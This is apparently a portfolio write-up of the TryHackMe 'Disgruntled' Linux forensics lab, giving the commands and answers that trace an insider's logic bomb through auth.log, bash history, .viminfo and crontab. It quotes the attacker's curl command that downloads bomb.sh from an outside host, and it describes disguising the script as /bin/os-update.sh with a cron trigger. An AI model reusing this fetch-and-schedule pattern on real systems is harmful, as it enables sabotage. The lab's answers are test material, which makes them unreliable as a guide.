📝 Project Title:

TryHackMe – Disgruntled: Linux Forensics for Post‑Employment Logic Bomb Detection

🎯 Objective:

Investigate a Linux host for signs of malicious insider activity following a suspicious event. Focus on uncovering privilege escalation, unauthorized user creation, script creation and deployment (logic bomb), persistence mechanism via cron, and intended destructive action.

🛠️ Tools Used:

Linux command‑line (grep, cat, ls, cd)
/var/log/auth.log for sudo log auditing
User history analysis (.bash_history, .viminfo)
File metadata inspection (ls ‑la, file timestamps)
Text editors (vi, nano)
crontab analysis

❌ Skills Demonstrated:

Privileged access and process tracking via auth logs
Analysis of insider threat behavior (user creation, logic bomb)
File metadata and script content inspection
Persistence detection via scheduled tasks (cron)
Contextual timeline reconstruction

Project Overview

In this scenario, you assume the role of a Linux forensic analyst in a simulated environment where a disgruntled IT employee may have deployed a logic bomb. You begin by reviewing privileged activity logs in /var/log/auth.log, follow command execution chains through user histories and metadata, identify the logic bomb script and its scheduled activation, and deduce the intended harmful action.

🔍 Task Breakdown


✏️ Task 1: The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?

⭕️ Objective: Find the exact command used to install a package with sudo.

⭕️ Method:
grep sudo /var/log/auth.log | grep install
Extract full command.

🔱 Answer: /usr/bin/apt install dokuwiki

✏️ Task 2: What was the present working directory (PWD) when the previous command was run?

⭕️ Objective: Determine what directory the install command was run from.

⭕️ Method: The same auth log entry includes a PWD field.

🔱 Answer: /home/cybert

✏️ Task 3: Which user was created after the package from the previous task was installed?

⭕️ Objective: Find the first user account added post-install.

⭕️ Method:
grep sudo /var/log/auth.log | grep adduser

🔱 Answer: it-admin

✏️ Task 4: A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)

⭕️ Objective: Determine when sudo privileges were added to the new user.

⭕️ Method:
grep sudo /var/log/auth.log | grep visudo

🔱 Answer: Dec 28 06:27:34

✏️ Task 5: A script file was opened using the "vi" text editor. What is the name of this file?

⭕️ Objective: Name the script file opened with vi.

⭕️ Method:
grep sudo /var/log/auth.log | grep vi

🔱 Answer: bomb.sh 

✏️ Task 6: What is the command used that created the file bomb.sh?

⭕️ Objective: Identify how the script was created (downloaded).

⭕️ Method:
cat /home/it‑admin/.bash_history | grep curl

🔱 Answer: curl 10.10.158.38:8080/bomb.sh --output bomb.sh

✏️ Task 7: The file was renamed and moved to a different directory. What is the full path of this file now?

⭕️ Objective: Determine where and under what name the script was saved.

⭕️ Method:
cat /home/it‑admin/.viminfo | grep saveas

🔱 Answer: /bin/os-update.sh

✏️ Task 8: When was the file from the previous question last modified? (Format: Month Day HH:MM)

⭕️ Objective: Find when the renamed script was last modified.

⭕️ Method:
ls -la /bin | grep os-update.sh

🔱 Answer: Dec 28 06:29

✏️ Task 9: What is the name of the file that will get created when the file from the first question executes?

⭕️ Objective: Name the file created by the logic bomb.

⭕️ Method:
cat /bin/os-update.sh

🔱 Answer: goodbye.txt

✏️ Task 10: At what time will the malicious file trigger? (Format: HH:MM AM/PM)

⭕️ Objective: Discover when the malicious script is set to execute.

⭕️ Method:
cat /etc/crontab
Use crontab format to decode timing.

🔱 Answer: 08:00 AM

🔍 Analysis and Reflection

💡 Challenges Faced:

Tying sudo log entries to specific user activity
Reconstructing hidden file operations via .viminfo
Decoding cron timing into human-readable form

💡 Lessons Learned:

Linux auth logs are invaluable for untangling insider threats
Shell histories and editor metadata can reveal hidden workflows
Cron job analysis is essential for discovering persistence mechanisms

💡 Relevance to SOC / Incident Response:

Demonstrates tracking of privilege misuse and logic bomb deployment
Shows how forensic artifacts (logs, histories, metadata) tie into a timeline
Useful for developing alerting mechanisms (e.g., new user + cron file change)

💡 Relevance to Penetration Testing / Red Teaming:

Illustrates post‑access misuse and misuse of built‑in tools
Highlights tool misuse and stealth via cron scheduling

✅ Conclusion

Using Linux logs and forensic artifacts, the investigation revealed an illicit script install and scheduling, culminating in the discovery of a logic bomb set to execute at 8 AM. Indicators? New it-admin account, /bin/os-update.sh, and scheduled /etc/crontab entry. Profiling these behaviors helps develop defenses and alerts.

💡 Skills Gained:

Auth.log and sudo history analysis
Reconstruction of post-exploit workflow
Cron-based persistence discovery
Timeline correlation across logs, histories, and filesystem

💡 Next Steps:

Build alerts for unusual sudo installs and user creation
Monitor /etc/crontab and script activity for anomalies
Simulate logic bombs for defense playbooks

![image alt](https://github.com/andre5Jr/soc-analyst-digital-forensics-and-incident-response-Disgruntled/blob/f6495bd64fa2e0c59ec8a8ff4b973e2dccc7d7f8/1-1.png)   

![image alt](https://github.com/andre5Jr/soc-analyst-digital-forensics-and-incident-response-Disgruntled/blob/f6495bd64fa2e0c59ec8a8ff4b973e2dccc7d7f8/4-1.png)   

![image alt](https://github.com/andre5Jr/soc-analyst-digital-forensics-and-incident-response-Disgruntled/blob/f6495bd64fa2e0c59ec8a8ff4b973e2dccc7d7f8/4-2%20Part%20One.png)   

![image alt](https://github.com/andre5Jr/soc-analyst-digital-forensics-and-incident-response-Disgruntled/blob/f6495bd64fa2e0c59ec8a8ff4b973e2dccc7d7f8/4-2%20Part%20Two.%20.png)   

![image alt](https://github.com/andre5Jr/soc-analyst-digital-forensics-and-incident-response-Disgruntled/blob/f6495bd64fa2e0c59ec8a8ff4b973e2dccc7d7f8/4-3%20.png)   

![image alt](https://github.com/andre5Jr/soc-analyst-digital-forensics-and-incident-response-Disgruntled/blob/f6495bd64fa2e0c59ec8a8ff4b973e2dccc7d7f8/5-1.png)   

![image alt](https://github.com/andre5Jr/soc-analyst-digital-forensics-and-incident-response-Disgruntled/blob/f6495bd64fa2e0c59ec8a8ff4b973e2dccc7d7f8/5-1%20Part%20Two..png)   

![image alt](https://github.com/andre5Jr/soc-analyst-digital-forensics-and-incident-response-Disgruntled/blob/f6495bd64fa2e0c59ec8a8ff4b973e2dccc7d7f8/5-2.png)   

![image alt](https://github.com/andre5Jr/soc-analyst-digital-forensics-and-incident-response-Disgruntled/blob/f6495bd64fa2e0c59ec8a8ff4b973e2dccc7d7f8/5-3.png)   

![image alt](https://github.com/andre5Jr/soc-analyst-digital-forensics-and-incident-response-Disgruntled/blob/f6495bd64fa2e0c59ec8a8ff4b973e2dccc7d7f8/5-4.png)   

![image alt](https://github.com/andre5Jr/soc-analyst-digital-forensics-and-incident-response-Disgruntled/blob/f6495bd64fa2e0c59ec8a8ff4b973e2dccc7d7f8/6-1.png)   

![image alt](https://github.com/andre5Jr/soc-analyst-digital-forensics-and-incident-response-Disgruntled/blob/f6495bd64fa2e0c59ec8a8ff4b973e2dccc7d7f8/6-1%20Part%20Two..png)   

![image alt](https://github.com/andre5Jr/soc-analyst-digital-forensics-and-incident-response-Disgruntled/blob/f6495bd64fa2e0c59ec8a8ff4b973e2dccc7d7f8/6-1%20Part%20Three.png)   

![image alt](https://github.com/andre5Jr/soc-analyst-digital-forensics-and-incident-response-Disgruntled/blob/f6495bd64fa2e0c59ec8a8ff4b973e2dccc7d7f8/6-1%20Part%20Four.png) 

